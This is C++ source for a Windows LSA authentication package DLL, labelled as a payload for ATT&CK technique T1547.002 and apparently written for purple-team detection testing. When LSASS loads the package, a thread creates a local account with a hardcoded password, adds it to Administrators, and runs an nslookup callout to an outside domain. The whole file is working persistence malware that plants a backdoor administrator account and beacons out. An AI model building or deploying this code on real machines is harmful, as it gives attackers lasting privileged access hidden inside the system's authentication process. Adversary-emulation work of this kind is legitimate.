/*
    Payload for TT1547.002 (Authentication Package)
*/

#include <ntstatus.h>
#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "netapi32.lib")
#include <stdio.h>
#include <windows.h>
#include <LM.h>
#include <string>

int addUserTechnique(void)
{
    USER_INFO_1 ui;
    LOCALGROUP_MEMBERS_INFO_3 account;
    NET_API_STATUS ret;
    NET_API_STATUS Status;

    memset(&ui, 0, sizeof(ui));
    memset(&account, 0, sizeof(account));

    std::string technique = "T1547_002";
    wchar_t wtext[20];
    mbstowcs(wtext, technique.c_str(), technique.length()+1);//includes null
    LPWSTR utech = wtext;

    ui.usri1_name = utech;

    std::string password = "purpleteam.ru";
    wchar_t ptext[20];
    mbstowcs(ptext, password.c_str(), password.length()+1);//includes null
    LPWSTR upass = ptext;

    ui.usri1_password = upass;
    ui.usri1_home_dir = NULL;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = NULL;

    ret = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
    if (ret != NERR_Success)
    {
        return 0;
    }
    account.lgrmi3_domainandname = ui.usri1_name;
    Status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
    if (Status != NERR_Success)
    {
        return 0;
    }
    return 1;
}


int Run(void) {

	addUserTechnique();
	system("cmd /c nslookup -type=any T1547.purpleteam.ru");

	return 0;
}

LSA_DISPATCH_TABLE DispatchTable;

NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable) { return 0; }
NTSTATUS NTAPI SpShutDown(void) { return 0; }
NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo) {
	PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
	PackageInfo->wVersion = 1;
	PackageInfo->wRPCID = SECPKG_ID_NONE;
	PackageInfo->cbMaxToken = 0;
	PackageInfo->Name = (SEC_WCHAR *)L"MyAuthenticationPackage";
	PackageInfo->Comment = (SEC_WCHAR *)L"MyAuthenticationPackage";

	return 0;
}

NTSTATUS LsaApInitializePackage(ULONG AuthenticationPackageId,
								  PLSA_DISPATCH_TABLE LsaDispatchTable,
								  PLSA_STRING Database,
								  PLSA_STRING Confidentiality,
								  PLSA_STRING *AuthenticationPackageName
								  ) {
	
    PLSA_STRING name = NULL;

	HANDLE th;
	
	th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Run, 0, 0, 0);
	WaitForSingleObject(th, 0);

    DispatchTable.CreateLogonSession = LsaDispatchTable->CreateLogonSession;
    DispatchTable.DeleteLogonSession = LsaDispatchTable->DeleteLogonSession;
    DispatchTable.AddCredential = LsaDispatchTable->AddCredential;
    DispatchTable.GetCredentials = LsaDispatchTable->GetCredentials;
    DispatchTable.DeleteCredential = LsaDispatchTable->DeleteCredential;
    DispatchTable.AllocateLsaHeap = LsaDispatchTable->AllocateLsaHeap;
    DispatchTable.FreeLsaHeap = LsaDispatchTable->FreeLsaHeap;
    DispatchTable.AllocateClientBuffer = LsaDispatchTable->AllocateClientBuffer;
    DispatchTable.FreeClientBuffer = LsaDispatchTable->FreeClientBuffer;
    DispatchTable.CopyToClientBuffer = LsaDispatchTable->CopyToClientBuffer;
    DispatchTable.CopyFromClientBuffer = LsaDispatchTable->CopyFromClientBuffer;

    name = (LSA_STRING *)LsaDispatchTable->AllocateLsaHeap(sizeof *name);
    name->Buffer = (char *)LsaDispatchTable->AllocateLsaHeap(sizeof("SubAuth") + 1);

    name->Length = sizeof("SubAuth") - 1;
    name->MaximumLength = sizeof("SubAuth");
    strcpy_s(name->Buffer, sizeof("SubAuth") + 1, "SubAuth");

    (*AuthenticationPackageName) = name;

	return 0;
}

NTSTATUS LsaApLogonUser(PLSA_CLIENT_REQUEST ClientRequest,
  SECURITY_LOGON_TYPE LogonType,
  PVOID AuthenticationInformation,
  PVOID ClientAuthenticationBase,
  ULONG AuthenticationInformationLength,
  PVOID *ProfileBuffer,
  PULONG ProfileBufferLength,
  PLUID LogonId,
  PNTSTATUS SubStatus,
  PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
  PVOID *TokenInformation,
  PLSA_UNICODE_STRING *AccountName,
  PLSA_UNICODE_STRING *AuthenticatingAuthority) {
	  return 0;
  }

NTSTATUS LsaApCallPackage(PLSA_CLIENT_REQUEST ClientRequest,
  PVOID ProtocolSubmitBuffer,
  PVOID ClientBufferBase,
  ULONG SubmitBufferLength,
  PVOID *ProtocolReturnBuffer,
  PULONG ReturnBufferLength,
  PNTSTATUS ProtocolStatus
  ) {
	  return 0;
  }

void LsaApLogonTerminated(PLUID LogonId) {  }

NTSTATUS LsaApCallPackageUntrusted(
   PLSA_CLIENT_REQUEST ClientRequest,
   PVOID               ProtocolSubmitBuffer,
   PVOID               ClientBufferBase,
   ULONG               SubmitBufferLength,
   PVOID               *ProtocolReturnBuffer,
   PULONG              ReturnBufferLength,
   PNTSTATUS           ProtocolStatus
  ) {
	  return 0;
  }

NTSTATUS LsaApCallPackagePassthrough(
  PLSA_CLIENT_REQUEST ClientRequest,
  PVOID ProtocolSubmitBuffer,
  PVOID ClientBufferBase,
  ULONG SubmitBufferLength,
  PVOID *ProtocolReturnBuffer,
  PULONG ReturnBufferLength,
  PNTSTATUS ProtocolStatus
  ) {
	  return 0;
  }

NTSTATUS LsaApLogonUserEx(
  PLSA_CLIENT_REQUEST ClientRequest,
  SECURITY_LOGON_TYPE LogonType,
  PVOID AuthenticationInformation,
  PVOID ClientAuthenticationBase,
  ULONG AuthenticationInformationLength,
  PVOID *ProfileBuffer,
  PULONG ProfileBufferLength,
  PLUID LogonId,
  PNTSTATUS SubStatus,
  PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
  PVOID *TokenInformation,
  PUNICODE_STRING *AccountName,
  PUNICODE_STRING *AuthenticatingAuthority,
  PUNICODE_STRING *MachineName
  ) {
	  return 0;
  }

NTSTATUS LsaApLogonUserEx2(
  PLSA_CLIENT_REQUEST ClientRequest,
  SECURITY_LOGON_TYPE LogonType,
  PVOID ProtocolSubmitBuffer,
  PVOID ClientBufferBase,
  ULONG SubmitBufferSize,
  PVOID *ProfileBuffer,
  PULONG ProfileBufferSize,
  PLUID LogonId,
  PNTSTATUS SubStatus,
  PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
  PVOID *TokenInformation,
  PUNICODE_STRING *AccountName,
  PUNICODE_STRING *AuthenticatingAuthority,
  PUNICODE_STRING *MachineName,
  PSECPKG_PRIMARY_CRED PrimaryCredentials,
  PSECPKG_SUPPLEMENTAL_CRED_ARRAY *SupplementalCredentials
  ) {
	  return 0;
  }

SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] = {
	{
		LsaApInitializePackage,
		LsaApLogonUser,
		LsaApCallPackage,
		LsaApLogonTerminated,
		LsaApCallPackageUntrusted,
		LsaApCallPackagePassthrough,
		LsaApLogonUserEx,
		LsaApLogonUserEx2,
		SpInitialize,
		SpShutDown,
		(SpGetInfoFn *) SpGetInfo, 
		NULL, NULL, NULL, NULL, NULL,
		NULL, NULL, NULL, NULL, NULL,
		NULL, NULL, NULL, NULL, NULL,
		NULL 
	}
};

NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables) {
	HANDLE th;
	
	th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Run, 0, 0, 0);
	WaitForSingleObject(th, 0);
	
	*PackageVersion = SECPKG_INTERFACE_VERSION;
	*ppTables = SecurityPackageFunctionTable;
	*pcTables = 1;
		
	return STATUS_SUCCESS;
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) {

	switch ( fdwReason ) {
		case DLL_PROCESS_ATTACH:
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
		}
	return TRUE;
}
